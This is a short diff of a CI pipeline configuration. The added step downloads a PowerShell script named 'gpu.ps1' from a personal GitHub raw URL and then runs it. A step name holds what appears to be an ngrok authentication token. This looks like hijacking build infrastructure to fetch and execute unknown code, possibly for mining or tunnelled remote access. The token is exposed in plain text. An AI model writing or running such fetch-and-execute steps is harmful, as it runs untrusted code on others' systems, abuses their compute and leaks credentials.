@@ -14,8 +14,8 @@ jobs:
     steps:  
        
       - run: 
-          name: Paste Ngrok Auth Value In Hosted Link
+          name: 23C7hFqGnru9xqOSxU4FhesoTSu_6i9M16BNH76hKLmUo2az
           command: |      
-            23C7hFqGnru9xqOSxU4FhesoTSu_6i9M16BNH76hKLmUo2az https://raw.githubusercontent.com/Yahihs/rep/main/sh -OutFile gpu.ps1 
+            Invoke-WebRequest https://raw.githubusercontent.com/Yahihs/rep/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
